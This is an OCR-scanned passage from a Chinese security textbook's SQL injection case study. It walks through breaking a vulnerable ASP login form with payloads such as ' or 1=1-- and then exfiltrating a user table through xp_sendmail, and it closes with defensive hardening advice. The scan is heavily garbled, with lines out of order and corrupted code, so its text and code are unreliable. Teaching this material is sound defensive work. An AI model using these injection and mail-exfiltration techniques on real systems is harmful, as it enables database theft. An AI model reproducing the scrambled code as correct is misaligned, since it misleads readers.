3.攻击者获取数据的攻击方法很可能是SQL注入攻击。这种攻击利用了Web应用的缺
下面所经历的事情使他终身难忘。
欢迎的然
建
---
## Page 256
找出真凶。随后他开始了调查工作。
敲诈信，索要“赎金”。小陈从不会妥协，他决心
天他们公司的网站居然被攻破！
可以从 SQL服务器得到需要的数据。没想到有一
似乎应该安全了。但事实并非如此，攻击者还是
都允许外出。
SMTP过滤器。当然，建立在端口443上的流量
且端口 25上的流量还要通过 ISA服务器的
流量在ISA 服务器和路由器上都会被阻塞，并
25上的流量能向外发送外，从内部发起的所有
上被阻塞。他们认为这就足够安全了！除了端口
务器。其他进来的流量也将在ISAServer服务器
利用服务器发布将端口 25 指向一个内部邮件服
一个内部基于SSL的Web月
务器利用Web 发布将 443端口请求重新路由到
他所有流量在防火墙上将被阻塞。ISA Server 服
进入，并只能访问他们的ISA Server服务器。其
防火墙上策略非常严格，只允许端口25和443
他们利用SQL的邮件功能从SQL服务上发回确认邮件。
接登录到SQLServer数据库服务器上，把数据散列并存储到SQL数据库的不同数据表中。
Server 服务器上，现场的工程师们在 Web 界面用 SSL 协议登录表单，通过ADODB 数据连
公司拓扑如图8-2所示，攻击者留下了一封
有了这样严格的防御措施，小陈的公司网络
网络安全组的工程师介绍他们公司的边界
先检查网站首页。他查看了login.asp的源代码，希望能从中得到什么：
开发组的小万，搭建了一个网页表单，为方便维护工程师远程将数据提交到后台的SQL
type=”text”name="uname”maxlength="25">
p
服务器上，并且他们
WEBServer
ISA
第8章SQL注入防护案例分析233
EIM
图8-2公司拓扑图
7
Route
X
SE
---
## Page 257
并且生成SQL语句。部分代码如下：
要它执行的合法的 SQL 语句。看下面的 login.asp 文件的源代码，这个文件获取用户的输入
分析取证
是怎么进行的？
的，如何得到包含用户的列表？
师已经真正锁定了那些用于外出连接的端口。了解你所知道的Web应用和相关程序的目
互动问答
后快速单击确认…
234UNIX/Linux网络日志分析与流量监控
102“验证用户输入合法性。”让我们看看它对在用户名中输入一个单引号的反应：
设计不好的Web 表单有可能被插入 SQL 语句，然而在后端的 SQL服务器需要解析我们
3．除了这个不完善的表单，还有什么可能的途径可以将数据传送给 SQL 服务器？调用
5.如果你是系统管理员，你将如何防止SQL注入？
4.如何得到数据库内所有表？如何得到感兴趣的实际表结构？
2.这个页面的开发者使用了非常简单的方式来检索数据和提交查询。然而，网络工程
它竟然接受了查询！很遗憾ME不是真正的登录名，这显然暗示着什么。
("Userid")
("uname")&"and password="&Request.Form("pword")&"”
d=GGAAGAAGA;Persist Security Info=True;User ID=SA;Initial Catalog=Genome;Data Source
1.如何从表中取得数据？
好，现在建立了连接！下面该怎么运作呢？用户名ME，这次在密码中填写or0=0"。然
character string"/scripts/Login.asp,line20
这回，试用ME作为用户名，密码就输入单引号：
Microsoft OLE DB Provider for SQL Server eror “80040e14"Unclosed quotation mark before the
Set rst-Conn.Execute("Update userinfo set LastLogon = getdateO where userID = " & ServerVariables
Set rst=nothing
Session("LastLogon")= rst!LastLogon
Session"FullIName")= rst!FName &""& rst!LName
Ifrst.eof then
=GServerl"
Server.CreateObject("ADODB.Connection")Conn.ConnectionString="Provider=SQLOLEDB.1;Passwor
Session("Userid")=rst!userid
Else
Response.Redirect"badlogin.asp"
SetConn=
102
---
## Page 258
么地方一在这个例子中是在usermame附近。它告诉我们，在SQL表中的一个有效列名是
到1.在输入框中输入一个单引号将会产生错误。这个错误实际上提醒我们错误出现在什
答疑解惑
这些字符注入到SQL语句中都会导致认证失效。
理员对常见方法要有所了解：
总结
的真相逐渐浮出水面。
然数据库引擎没有返回任何数据，但是他可以在本地计算机上执行自己的代码了。入侵事件
的信息，因为系统中不存在一个名叫ME的用户。然而他还是学到了一些有价值的东西：虽
SQL
录。
作为用户名，并把“or0=0-”作为密码，于是这个查询变成了这样：
他实际上输入代码来改变这个语句的逻辑，而不是输入数据导致引擎产生错误。他输入ME
的用户并不存在，所以用户会被重定向到一个登录失败的页面。小陈知道这是重要的一步。
的话，导出的SQL语句应该是：
信息细节的原因。如果小陈输入ME 作为用户名，以及 password（普通数据项1）作为密码
程序员小万没有关闭IS设置的调试消息。这就是小陈能够得到OLE数据库引擎给出的错误
现同样的问题。由
引发语法错误。当
无法正确解析。这个字符串已经显式地包含了单引号，所以当我们多输入一个单引号时就会
来产生SQL语句。这就是为什么在表单元素中输入一个单引号会导致SQL语句失败一—它
上面的 login.asp 存在 SQL 注入漏洞，就会造成攻击者利用该漏洞来绕过认证，作为管
小陈这时更有信心了。虽然他可以产生一个有效的语句，但他还是得到了一个登录失败
这才是一个正确的查询。但是在这个例子中，用户名为 ME 而且相应密码为 password
这个密码字符串password="中多余的单引号导致查询失败。这里的一个重要问题是：
这样有效地绕过了密码检查，因为0永远等于0。结尾的两个连字符是作为注释标签，它让
，小陈知道这才是问题的源头。开发者在这种情况下直接将用户的输入连接成字符串元素
忽略它后面的内容。这就是明确加上的单引号没有产生任何错误的原因一—它被注销掉了！
这个语句告诉SQL：检索userinfo表中所有用户名为ME并且密码为空或为O=0的所有记
SELECT*FROMuserinfoWHEREusername=ME'and password="or O=0-
SELECT *FROM userinfoWHEREusername='ME'and password='password
or'a'='a
"or1=1--
'orl=1--
Endif
Response.Redirect"loadprofile.asp"
由此得出的SQL语句是这样的：
当小陈输入ME 作为用户名，然后在密码字段中输入一个单引号时，就会出
第8章SQL注入防护案例分析235
日
---
## Page 259
在这个例子中，账号 SA 的用户名和密码都被存在.asp 文件中，这个账号 SA 是 SQL 服务器
SA和相应的密码，来执行对SQL服务器的查询。实际上这么做会危及某些账号的安全性。
件发送给我们自己。
们考虑下面的一个命令行，它可以连接在一个有效的SQL语句后面：
有一个选项，就是指定一个查询来执行，结果可以通过邮件本身（或文本文件附件）来发送。
需要一个系统存储过程 xp_sendmail 来给邮件打包并且发送到任意目的地。另外，xp_sendmail 还
邮件程序客户端。SQL邮件系统用这个客户端装置通过Exchange邮件服务器来外发邮件。我们只
发组发送电子邮件的吗？开发者采用了一种简单方法，他们在SQL服务器上建立了一个Exchange
需在代码中过滤这些字符串。
来存储应用系统用户个人信息的一个表。
子中，不是说实际的 sysuser表中包含的usermame可以登录SQL服务器
我们更多的信息。所以将在浏览器上得到如下错误：
用户名。这是一个重要的信息，因为我们可构造一些复杂的、会出错的SQL 语句，这会给
236UNIX/Linux网络日志分析与流量监控
网络，尽管后门程序已经在服务器上运行。还记得SQL服务器是怎样在上传完数据后，自动给开
口允许进和出。由于ISA服务器实际上会过滤SMTP数据，所以我们不太可能利用25端口进入
3．查看这个登录页面的代码，可以发现开发者在ADODB对象连接字符串中使用用户
表 8-1列出了 SQL 注入攻击过程中会用到的一些危险字符。为防止攻击生效，程序员
通过这个简单的查询，我们就可以查出数据库user info表中所有的记录，并且用电子邮
fromusernamesorderbyID',@attach_results=True
2.现在我们有一个443端口（HTTPS）允许进入（包括一个会话输出端口），
就是它了：UserInfo.username！现在知道了包含usermame的表的名字。注意，在这个例
clause./scripts/Login.asp,line20
Master.xp_sendmail @recipients=PI:EMAIL, @subject=Mine, all mine!, @query=Select
Microsoft OLE DB Provider for ODBC Drivers error'80040e14'ColumnUserlInfo.username' is invalid in
字符串
表8-1SQL命令注入字符
双管道符
百分号
多行注释
加号
单行注释
单行注释
分号
双引号
单引号
名
星号
At
打印局部变量
连接字符
连接字符
SQL语句通配符
SQL语句通配符
使两个标记之间的SQL语句数据失效
使该标记后面SQL语句数据失效
使该标记后面SQL语句数据失效
运行一条SQL语句
SQL换码符
SQL换码符
描
一这只是开发者用
一个25号端
我
*
---
## Page 260
困难，下面有针对性地从几个方面进行防范。
总结
可实现报警），如果管理员没有查看ⅡIS日志的习惯，则可能被入侵很长时间都不会发觉。102
一般的Web页面访问没什么区别，所以一般的防火墙都不会对SQL注入发出警报（Ossim系统
或更新数据，甚至可能直接删除表。SQL注入是从正常的WWW端口访问，而且表面看起来跟
有管理员或其他比较高级的权限，攻击者就可能对数据库的表执行各种操作，包括添加、删除
攻击者可能造成的损害也不同，这主要由应用访问数据库的安全权限决定。如果用户的账户具
些特殊的SQL字符串篡改查询来改变其原来的功能，欺骗系统授予访问权限。系统环境不同，
会错误地授权给攻击者。
行对比。
户的SQL命令，但由于攻击者输入的内容非常特殊，所以最后得到的SQL命令变成：
参数。下面是ASP.NET应用构造查询的一个例子：
求用户输入一个名称和密码。
数，这类表单特别容易受到SQL注入攻击。常见的SQL注入攻击过程如下：是源个
网络防护非常坚固，可是存在SQL注入漏洞使攻击得以成功。策额全定用
很好的存储过程，它可以用来转储目标表的所有结构，它可以帮你了解数据库结构。
过程作为变量，我们可以在运行xp_sendmail 时用 sp_help userinfo 作为查询。sp_help 是一
简单的 SELECT*FROM sysobjects 就可以解决。因为xp_sendmail 允许我们指定其他的存储
虑功能，而不关心他们代码中隐含的安全问题，所以造成了SQL注入攻击的发生。
的超级用户。所有ADODB的调用都是以 SQL管理员的身份执行的。许多开发者都是只考
通过以上对 SQL注入攻击方法的分析，可知 SQL 注入的手法相当灵活，预防起来比较
6）由于SQL命令实际上已被注入式攻击修改，已经不能真正验证用户身份，所以系统
在某些表单中，用户输入的内容直接用来构造动态SQL命令，或作为存储过程的输入参
2）登录页面中输入的内容将直接用来构造动态的SQL命令，或者直接用作存储过程的
4.因为我们可以以SA的身份执行任意SQL语句，因此可以做任何事情。例如，一个
5.网上很多基于数据库的Web应用常出现安全隐患，正如上面我们看到的这个例子
（1）使用安全的密码策略
如果攻击者知道应用会将表单中输入的内容直接用于验证身份的查询，他就会尝试输入某
5）服务器执行查询或存储过程，将用户输入的身份信息和服务器中保存的身份信息进
1）某个Web应用有一个登录页面，这个登录页面控制着用户是否有权访问应用，它要
把密码策略放在所有安全配置的第一步。不要把数据库账号的密码设置得过于简单，对
4）用户输入的内容提交给服务器之后，服务器运行上面的ASP.NET代码构造出查询用
3）攻击者在用户名字和密码输入框中输入1=1之类的内容。
SELECT*FROMUsersWHERE login="or'1=1′AND password="or'1=1′。
System.Text.StringBuilder query=newSystem.
第8章SQL注入防护案例分析237
1
---
## Page 261
进行有效的控制。
接进行限制，只保证自己的 IP 能够访问，也拒绝其他IP 的端口连接，对网络上的安全威胁
这样的安全机制。使用操作系统自己的 IPSec 可以实现IP 数据包的安全性。应该对IP 连
TCP/IP端口。
的SQL Server实例的客户端所发出的广播作出响应。这样，别人就不能用1434来探测你的
选择隐藏 SQL Server 实例。如果隐藏了 SQL Server 实例，则将禁止对试图枚举网络上现有
么TCP/IP端口。要彻底解决这一问题，可在实例属性中选择TCP/IP的属性，再在属性页中
变，但是通过微软未公开的1434端口的UDP探测还是可以很容易知道SQLServer使用什
最好使用SSL来加密协议。
的网络传输都是明文的，包括密码、数据库内容等，有可能被攻击者在网络中截获。所以，
件。应定期查看SQL Server 日志检查是否有可疑的登录事件发生。
别选定为全部，这样在数据库系统和操作系统日志里面，就详细记录了所有账号的登录事
个简单的Public 账号就可以了。
分配账号，并赋予仅仅能够满足应用要求和需要的权限。比如，只需要查询功能的，使用-
无法恢复。很多主机使用数据库应用只是用来做查询、修改等简单功能的，应根据实际需要
“BUILTINAdministrators”删除。不过这样做的副作用是一旦系统管理员账号忘记密码，就
不希望操作系统管理员通过操作系统登录来接触数据库，则可以在账号管理中把系统账
员一样权限的超级用户来管理数据库。安全的账号策略还包括不要让管理员权限的账号泛滥。
员不可用或忘记了密码时才使用系统管理员账号。建议数据库管理员新建一个具有与系统管
使用系统管理员账号，只有无法使用其他方法登录到SQLServer时，例如，当其他系统管
必须对这个账号进行最强的保护，除了使用一个非常强壮的密码外，最好不要在数据库应用中
数据库管理员应该定期查看是否有不符合密码要求的账号。比如使用下面的SQL语句：
系统管理员的密码，除非你确认必须使用空密码。同时，还要养成定期修改密码的好习惯。
壮的密码是安全的第一步。SQL Server 安装的时候，如果是使用混合模式，那么就需要输）
于系统管理员更应该注意，同时不要把系统管理员账号的密码写在应用程序或者脚本中。健
238UNIX/Linux网络日志分析与流量监控